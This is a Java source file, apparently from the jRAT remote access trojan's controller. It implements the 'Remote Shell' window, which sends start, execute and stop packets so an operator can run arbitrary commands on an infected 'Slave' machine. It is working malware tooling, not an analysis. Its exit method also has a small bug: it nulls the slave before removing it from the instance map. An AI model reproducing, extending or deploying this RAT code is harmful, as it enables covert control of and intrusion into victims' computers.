package se.jrat.controller.ui.frames;

import java.awt.BorderLayout;
import java.awt.Toolkit;
import java.awt.event.AdjustmentEvent;
import java.awt.event.AdjustmentListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.util.HashMap;
import java.util.Map;

import javax.swing.JFrame;
import javax.swing.JScrollBar;
import javax.swing.JScrollPane;

import se.jrat.controller.Slave;
import se.jrat.controller.packets.outgoing.Packet23RemoteShellStart;
import se.jrat.controller.packets.outgoing.Packet24RemoteShellStop;
import se.jrat.controller.packets.outgoing.Packet25RemoteShellExecute;

import com.redpois0n.terminal.InputListener;
import com.redpois0n.terminal.JTerminal;
import com.redpois0n.terminal.SizeChangeListener;

@SuppressWarnings("serial")
public class FrameRemoteShell extends JFrame {

	public static final Map<Slave, FrameRemoteShell> INSTANCES = new HashMap<Slave, FrameRemoteShell>();
	
	private Slave slave;
	private JTerminal terminal;
	private JScrollPane scrollPane;

	public FrameRemoteShell(Slave slave) {
		super();
		setResizable(false);
		this.slave = slave;
		INSTANCES.put(slave, this);
		addWindowListener(new WindowAdapter() {
			@Override
			public void windowClosing(WindowEvent arg0) {
				exit();
			}
		});
		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameRemoteShell.class.getResource("/icons/cmd.png")));
		setTitle("Remote Shell");
		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
		setBounds(100, 100, 499, 302);

		scrollPane = new JScrollPane();
		terminal = new JTerminal();
		scrollPane.setViewportView(terminal);
		
		scrollPane.getVerticalScrollBar().addAdjustmentListener(new AdjustmentListener() {  
		    public void adjustmentValueChanged(AdjustmentEvent e) {  
		    	if (terminal.scrollToBottom()) {
		    		boolean scrollUp = terminal.scrollUp();
		    		e.getAdjustable().setValue(scrollUp ? 0 : e.getAdjustable().getMaximum());  
		    	} 
		    }
		});
		
		terminal.addInputListener(new InputListener() {
			@Override
			public void processCommand(JTerminal terminal, String command) {
				if (command.equalsIgnoreCase("clear") || command.equalsIgnoreCase("cls")) {
					terminal.clear();
					return;
				}
				System.out.println(command);
				send(command + "\n");
				terminal.setBlockAtCurrentPos();
			}
			
			@Override
			public void onTerminate(JTerminal terminal) {
			
			}
		});
		
		terminal.addSizeChangeListener(new SizeChangeListener() {
			@Override
			public void sizeChange(JTerminal terminal, int width, int height) {
				JScrollBar vertical = scrollPane.getVerticalScrollBar();
				scrollPane.revalidate();
				vertical.revalidate();
				vertical.setValue(vertical.getMaximum());
				terminal.revalidate();
			}
		});
		
		add(scrollPane, BorderLayout.CENTER);

		addKeyListener(terminal.getKeyListener());
		setSize(675, 300);
		
		slave.addToSendQueue(new Packet23RemoteShellStart());
	}
	
	private void send(String command) {
        slave.addToSendQueue(new Packet25RemoteShellExecute(command));
	}
	
	public JTerminal getTerminal() {
		return terminal;
	}

	public void exit() {
		slave.addToSendQueue(new Packet24RemoteShellStop());
		slave = null;
		INSTANCES.remove(slave);
	}
}
